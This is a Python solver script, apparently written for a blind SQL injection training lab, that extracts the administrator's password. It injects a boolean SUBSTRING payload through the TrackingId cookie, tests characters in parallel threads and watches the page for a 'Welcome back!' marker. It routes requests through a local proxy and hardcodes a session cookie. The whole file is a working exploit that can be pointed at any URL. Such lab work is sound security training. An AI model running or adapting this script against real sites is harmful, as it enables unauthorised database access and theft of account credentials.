'''
@Author: Abdelaziz Neamatallah
@Date: 28.12.25
@Description: Solving Bline SQLi lab11 using multi-threading to speed up the extraction process.
'''

# Important libraries
import sys # used to read arguments from command line
import requests # to make http requests
import urllib3 # used to disable ssl warnings
import urllib.parse # to encode payloads
from concurrent.futures import ThreadPoolExecutor, as_completed # for multi-threading
# ThreadPoolExecutor allows us to create a pool of threads to execute calls asynchronously.
# as_completed is used to iterate over futures as they complete in order they finish.


# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Tells requests to use a proxy (e.g., Burp Suite) which listens on localhost:8080
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Constants used in the attack
SESSION_COOKIE = "nVv9ss2PgSytL7GtOi6D48ErNIcpQeAY"
TRACKING_PREFIX = "LCmPwM5sbGgGTWHz"
SUCCESS_MARKER = "Welcome back!"

# -------- single request worker --------
def test_char(url, position, char):
    '''
        Input: 
            url: target URL
            position: position of the character in the password
            char: character to test
        Output:
            char if the character is correct, None otherwise
        Logic: 
            Constructs a payload to test if the character at the given position
            in the administrator's password matches the provided character.
            Sends the request and checks for the success marker in the response.
    
    '''

    # construct payload, with the current position and character to test
    payload = (
        f"' AND SUBSTRING((SELECT password FROM users "
        f"WHERE username='administrator'),{position},1)='{char}'-- "
    )

    # URL-encode the payload
    encoded_payload = urllib.parse.quote(payload)

    # set cookies with the encoded payload
    cookies = {
        "TrackingId": TRACKING_PREFIX + encoded_payload,
        "session": SESSION_COOKIE,
    }

    # send GET request
    r = requests.get(
        url,
        cookies=cookies,
        verify=False,
        proxies=proxies,
        headers={"Connection": "close"},  # force closing the connection after each request, reducing wired connection reuse.
        timeout=10, # set timeout to avoid hanging threads
    )

    # check if the response contains the success marker
    if SUCCESS_MARKER in r.text:
        return char

    return None


# -------- main extraction logic --------
def sqli_password(url):
    '''
        This is the main logic function
    '''

    # extracted password
    password = ""

    # character set to test (printable ASCII characters)
    charset = [chr(i) for i in range(32, 127)]

    # since we know the length of the password = 20, we loop over each position
    for position in range(1, 21):

        # boolean to track if we found the character at this position
        found_char = None

        # use ThreadPoolExecutor to test multiple characters in parallel
        with ThreadPoolExecutor(max_workers=15) as executor:

            # submit tasks for each character in the charset
            futures = {
                executor.submit(test_char, url, position, c): c
                for c in charset
            }

            # as futures complete, check their results
            for future in as_completed(futures):
                result = future.result()

                # if result is not none
                if result:
                    found_char = result
                    password += result
                    print(f"[+] Position {position}: {result}")

                    # shutdown executor to stop remaining tasks
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

        if not found_char:
            print(f"[-] No character found at position {position}")
            break

    print(f"\n[✓] Extracted password: {password}")


def main():
    if len(sys.argv) != 2:
        print("Usage: python3 solver_script.py <url>")
        sys.exit(1)

    print("[*] Retrieving password for user administrator...")
    sqli_password(sys.argv[1])


if __name__ == "__main__":
    main()
